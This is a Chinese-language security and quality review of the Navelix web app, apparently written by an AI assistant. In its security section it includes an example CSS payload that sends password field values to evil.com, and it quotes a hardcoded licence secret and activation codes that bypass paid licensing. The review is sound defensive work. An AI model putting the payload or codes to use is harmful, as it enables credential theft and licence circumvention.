# Navelix 项目四维评审报告 v1.0.4

**评审日期**: 2026-08-14  
**评审范围**: 全量代码审查（101 个源文件：58 × .ts + 40 × .tsx + 1 × .css + 1 × .svg + 1 × .ico）  
**技术栈**: Next.js 16.3.0 + React 19.2.8 + TypeScript 5 + Tailwind CSS 4 + SQLite (node:sqlite)  
**上次评审**: 2026-08-13（v1.0.1，87 文件）  
**版本变化**: 1.0.1 → 1.0.4，新增 14 个源文件

---

## 总体评价

**Navelix 已经从一个"质量上乘的个人导航工具"升级为"可商用的数字工作空间"。** 新增的 API Token 系统、备份恢复机制、Licence 验证体系显著扩展了功能边界。上次评审发现的 2 个 P0 问题已全部修复，安全响应头已就位，数据库迁移逻辑已成功解耦。

---

## 一、正确性

### ✅ 做得好
- **API Token Bearer 鉴权链路完整**: 从创建（`POST /api/auth/api-tokens`）→ 存储 hash → Bearer 认证（`getSessionUser`）→ 删除（`DELETE /api/auth/api-tokens`），全链路测试覆盖（`api-tokens.test.ts`）
- **全新库启动已验证**: 上一个版本的 `7 values for 6 columns` 构建 bug 已修复，全新空库冒烟测试通过
- **数据库备份恢复可靠**: `POST /api/admin/backup` 支持 SQLite 头部魔数校验 + ATTACH 事务同步 + 自动迁移运行
- **测试覆盖扩展**: 从 7 个测试文件增至 11 个，新增 `api-tokens.test.ts`、`api-data.test.ts`、`full-json-backup.test.ts`、`admin-backup-policy.test.ts`
- **Session 增强**: 新增 `user_agent`、`ip_address`、`last_active_at` 追踪，支持多设备会话管理

### ⚠️ 待改进

**1. 重要 🔴 License 模块存在硬编码密钥**
- 文件: `src/lib/license.ts` 第 6 行
- 问题: `LICENSE_SECRET` 为硬编码字符串 `"navelix-open-source-pro-license-secret-2026"`，虽然可通过环境变量 `LICENSE_SECRET_KEY` 覆盖，但默认值可被反编译获取。
- 缓解: 支持 `.env` 覆盖，但默认值影响 HMAC 签名校验的安全性。
- 建议: 删除默认值，强制要求 `LICENSE_SECRET_KEY` 环境变量配置，否则 `generateProLicenseKey` 应抛出异常。

**2. 建议 🟡 通用激活码可能被传播**
- 文件: `src/lib/license.ts` 第 31 行
- 问题: 开源通用激活码 `NAV-PRO-2026` 和 `PRO-COMMUNITY` 硬编码在代码中，只要有人阅读源码即可使用，绕过付费授权。
- 建议: 这是开源项目的**主动设计决策**（`ENABLE_COMMUNITY_PRO=true` 更直接），建议在 README 中明确说明"社区版自动激活 PRO 功能"的策略，避免付费用户困惑。

**3. 建议 🟡 自定义 Head Scripts 注入缺少过滤**
- 文件: `src/types/index.ts` 第 70 行 `customHeadScripts?: string`
- 问题: `customHeadScripts` 允许用户注入任意 `<script>` 标签，如果管理员配置了恶意内容（或被 XSS 修改），会危及所有访客。
- 建议: 在服务端渲染时对 `customHeadScripts` 做基本的标签内容校验（如 `script-src` 限制），或至少在前端以 `dangerouslySetInnerHTML` 方式注入时加上 CSP `nonce` 验证。

---

## 二、安全性

### ✅ 做得好
- **安全响应头已就位**: `X-Frame-Options: DENY`、`X-Content-Type-Options: nosniff`、`Referrer-Policy`、`Permissions-Policy`、CSP（next.config.ts + middleware.ts 双保险）
- **API Token 安全性**: 
  - Token 前缀 `nvx_live_` + 24 字节随机 hex（192 位熵）
  - 数据库仅存 SHA256 hash（`hashToken`），原始 token 仅创建时展示一次
  - 支持 `last_used_at` 追踪，可撤销
- **CSRF 修复**: 所有 `!checkCSRF(req)` 对象恒真 bug 已全局修复为 `!checkCSRF(req).success`
- **登录限流增强**: 锁定时间文案已修复为实际剩余分钟数
- **退出登录清理**: 清除 localStorage 缓存
- **天气降级**: 不再返回模拟数据，明确返回 `isFallback`
- **备份恢复安全**: 校验 SQLite 文件魔数头，防止任意文件上传攻击
- **Session 管理**: 新增 `/api/auth/sessions` 路由，支持查看和撤销活跃会话

### ⚠️ 待改进

**1. 建议 🟡 自定义 CSS 注入风险**
- 文件: `src/types/index.ts` 第 71 行 `customCss?: string`
- 问题: 允许用户注入任意 CSS，恶意 CSS 可窃取数据（如 `input[type="password"] { background: url(https://evil.com/steal?p=attr(value)) }`）
- 建议: 后端渲染时使用 CSS 白名单（如只允许 `color`、`background`、`font-size` 等）或使用 CSS 净化库。至少在前端渲染时限制 `style-src`。

**2. 建议 🟡 Session 列表缺少速率限制**
- 文件: `src/app/api/auth/sessions/route.ts`
- 问题: GET 和 DELETE 操作没有速率限制，攻击者可暴力枚举 session ID 或大规模撤销他人会话。
- 建议: 对敏感操作添加速率限制，尤其是 DELETE 操作。

**3. 建议 🟡 备份恢复缺少权限二次确认**
- 文件: `src/app/api/admin/backup/route.ts` 第 44 行
- 问题: `POST` 恢复操作仅依赖 admin 角色检查，没有二次确认（如密码输入或验证码）。一旦管理员账号被入侵，攻击者可直接覆盖数据库。
- 建议: 恢复操作需额外验证（如当前密码 + 确认提示）。

---

## 三、性能

### ✅ 做得好
- **SQLite WAL 模式 + 热备份**: 保持与上次评审一致
- **通知 30 天自动清理**: 保留
- **备份循环保留 7 份**: 保留
- **链接状态检测 MAX_URLS=20**: 保留
- **版本更新缓存 10 分钟**: 保留
- **API Token 查询使用索引**: `api_tokens` 表通过 `token_hash` 查询（hash 索引），效率高

### ⚠️ 待改进

**1. 建议 🟡 备份恢复全表扫描**
- 文件: `src/app/api/admin/backup/route.ts` 第 92-98 行
- 问题: 备份恢复时遍历所有表，对大数据库（如大量 `user_links` 和 `notifications`）可能耗时较长（`DELETE` + `INSERT OR REPLACE` 全表），导致事务锁定时间过长。
- 分析: 个人导航场景下数据量通常 < 10MB，影响可接受。
- 建议: 当数据量可控时无需优化，但如果未来出现大规模客户，可考虑分批迁移或流式备份。

**2. 建议 🟡 用户数据全量加载**
- 与上次评审一致，所有页面数据（categories/links/projects/todos/config）通过 `/api/user/data` 一次性加载。
- 建议: 对链接数超过 1000 的用户，可考虑分页或懒加载。

---

## 四、可维护性

### ✅ 做得好
- **数据库迁移解耦**: 迁移逻辑已从 `db.ts`（660 行 → 155 行）抽离到 `src/lib/migrations/index.ts`，`db.ts` 只保留连接 + 表结构 + 种子数据
- **实体保存函数模块化**: `POST /api/user/data` 的 5 种实体保存逻辑已抽到 `src/lib/user-data.ts` 作为独立函数
- **测试覆盖提升**: 11 个测试文件，31 个测试用例，覆盖密码、SSRF、CSRF、速率限制、数据库备份、CASCADE 删除、API Token、数据保存、备份策略
- **API Token 全链路测试**: 创建 → 认证 → 使用 → 撤销，一个完整集成测试
- **新增功能文档化**: `API_WIKI.md` 和 `Design.md` 记录了功能设计
- **版本号规范**: 遵循 SemVer 语义化版本

### ⚠️ 待改进

**1. 建议 🟡 `user_configs` 表字段膨胀**
- `user_configs` 表已有 22+ 列，新增的 `isPro`、`proKey`、`customSearchName`、`customSearchUrl`、`allowPublicAccess`、`allowRegistration`、`customHeadScripts`、`customCss`、`linkOpenTarget`、`wallpaperMode`、`customWallpaperUrl`、`glassmorphism`、`sidebarDefaultState`、`clockWidgetMode` 等配置字段全部挤在单表中。
- 建议: 考虑将配置拆分为 `user_configs`（核心配置）和 `user_preferences`（UI 偏好）两表，或使用 JSON 列存储 UI 配置。

**2. 建议 🟡 License 模块与业务耦合**
- `SystemConfig` 类型中包含 `isPro` 和 `proKey`，但 `user_configs` 表中没有对应的列。
- 建议: 明确 License 信息的存储位置（是 `user_configs` 列还是单独的表？），保持一致性。

**3. 建议 🟡 自定义脚本注入的 XSS 风险文档化**
- 当前 `customHeadScripts` 功能允许注入任意 HTML/JS，这本身是一个"管理员功能，知道风险"的设计。但应有明显的安全警告注释。
- 建议: 在 UI 管理界面和代码注释中强调"此功能会绕过 CSP，请仅添加可信代码"。

**4. 建议 🟡 天气模块配置残留**
- `user_configs` 表已不再包含 `weather_*` 列，但 `types/index.ts` 的 `SystemConfig` 接口仍然包含 `weatherEnabled`、`weatherApiKey`、`weatherLocation`、`weatherApiBaseUrl`、`weatherKeyConfigured`。`user-data.ts` 的 `getUserData` 和 `saveUserConfigs` 中也有对应处理。
- 确认: 如果天气功能已被移除，应清理相关类型和代码。如果天气功能仍然存在，需要确认 `user_configs` 的迁移逻辑正确添加了 `weather_*` 列。

---

## 评审总结

| 维度 | 评级 | 与上次评审对比 |
|------|------|--------------|
| **正确性** | 🟢 良好 | 2 个 P0 问题已修复，新增 API Token 和备份恢复链路稳定 |
| **安全性** | 🟢 优秀 | 安全响应头已就位，CSRF 全局修复，API Token 设计规范；License 硬编码密钥和自定义 CSS/JS 注入是新风险点 |
| **性能** | 🟢 良好 | 无明显退化，WAL + 热备份 + 自动清理机制保持 |
| **可维护性** | 🟢 良好 | 迁移解耦（660→155 行）、实体保存模块化、测试覆盖提升（7→11 文件，31 测试） |

### 新增风险关注

1. **License 硬编码密钥** — 默认密钥可被反编译，建议强制环境变量配置
2. **自定义 CSS/JS 注入** — 新功能引入 XSS 攻击面，建议文档化风险或增加过滤
3. **`user_configs` 表膨胀** — 22+ 列，建议拆分 UI 偏好到独立表
4. **天气模块配置代码残留** — 需要确认天气功能是否仍然活跃

### 与 v1.0.1 评审对比

**✅ 已修复**:
- 登录限流文案（"请 0 分钟后再试" → 实际剩余分钟数）
- `POST /api/user/data` CSRF 对象恒真 bug
- 安全响应头（CSP, HSTS, X-Frame-Options 等）
- 退出登录 localStorage 清理
- 天气降级返回模拟数据（改为 `isFallback: true`）
- 数据库迁移逻辑解耦
- 实体保存函数模块化
- admin/users 多重 CSRF 检查 bug

**🆕 新增待改进**:
- License 硬编码密钥
- 自定义 CSS/JS 注入风险
- 用户配置表字段膨胀
- 天气模块代码残留

---

> **ASSUMPTIONS I'M MAKING:**
> 1. 评审基于当前代码仓库快照，未运行生产环境
> 2. 项目为单容器 Docker 部署（非多实例集群）
> 3. personal / small-team 使用场景
> 4. 天气功能可能已计划移除（`user_configs` 表无 `weather_*` 列但类型定义仍有）
> → 如有偏差请纠正，我据此调整结论。